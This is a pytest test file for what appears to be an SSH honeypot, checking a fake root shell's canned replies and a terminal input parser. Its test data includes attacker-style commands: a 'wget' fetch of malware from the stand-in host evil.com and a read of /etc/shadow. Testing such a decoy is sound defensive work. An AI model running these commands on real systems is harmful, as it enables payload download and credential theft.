import pytest
from ssh_server import TerminalStream, CommandDispatcher


def test_command_dispatcher_known_commands():
    dispatcher = CommandDispatcher(hostname="ubuntu-srv")

    assert dispatcher.dispatch("whoami") == "root"
    assert "uid=0(root)" in dispatcher.dispatch("id")
    assert "/root" in dispatcher.dispatch("pwd")
    assert "Linux" in dispatcher.dispatch("uname")
    assert "ubuntu-srv" in dispatcher.dispatch("hostname")
    assert "Desktop" in dispatcher.dispatch("ls -la")
    assert "No such file" in dispatcher.dispatch("cat /etc/shadow")
    assert dispatcher.dispatch("cd /var/log") == ""


def test_command_dispatcher_unknown_command():
    dispatcher = CommandDispatcher(hostname="ubuntu-srv")
    assert dispatcher.dispatch("wget http://evil.com/malware") == "wget: command not found"


def test_command_dispatcher_exit_commands():
    dispatcher = CommandDispatcher(hostname="ubuntu-srv")
    res_exit, should_exit = dispatcher.execute("exit")
    assert should_exit is True
    assert res_exit == ""

    res_logout, should_logout = dispatcher.execute("logout")
    assert should_logout is True


def test_terminal_stream_chunked_input():
    stream = TerminalStream()
    # Feed "who"
    events = stream.feed(b"who")
    commands = [e for e in events if e.kind == "COMMAND"]
    assert commands == []
    assert stream.current_line == "who"

    # Feed "ami\r\n"
    events = stream.feed(b"ami\r\n")
    commands = [e for e in events if e.kind == "COMMAND"]
    assert len(commands) == 1
    assert commands[0].value == "whoami"
    assert stream.current_line == ""


def test_terminal_stream_pasted_multibyte_command():
    stream = TerminalStream()
    events = stream.feed(b"uname -a\n")
    commands = [e for e in events if e.kind == "COMMAND"]
    assert len(commands) == 1
    assert commands[0].value == "uname -a"


def test_terminal_stream_backspace():
    stream = TerminalStream()
    stream.feed(b"pwdx\x7f")
    assert stream.current_line == "pwd"

    # Also test \b backspace
    stream.feed(b"1\b")
    assert stream.current_line == "pwd"


def test_terminal_stream_ctrl_c():
    stream = TerminalStream()
    stream.feed(b"partial command")
    events = stream.feed(b"\x03")
    assert any(e.kind == "INTERRUPT" for e in events)
    assert stream.current_line == ""


def test_terminal_stream_ctrl_d_eof():
    stream = TerminalStream()
    events = stream.feed(b"\x04")
    assert any(e.kind == "EOF" for e in events)


def test_terminal_stream_ansi_arrow_keys_filtered():
    stream = TerminalStream()
    # Feed UP arrow \x1b[A then "ls\n"
    events = stream.feed(b"\x1b[Als\n")
    commands = [e for e in events if e.kind == "COMMAND"]
    assert len(commands) == 1
    assert commands[0].value == "ls"
    echoes = "".join(e.value for e in events if e.kind == "ECHO")
    assert echoes == "ls"
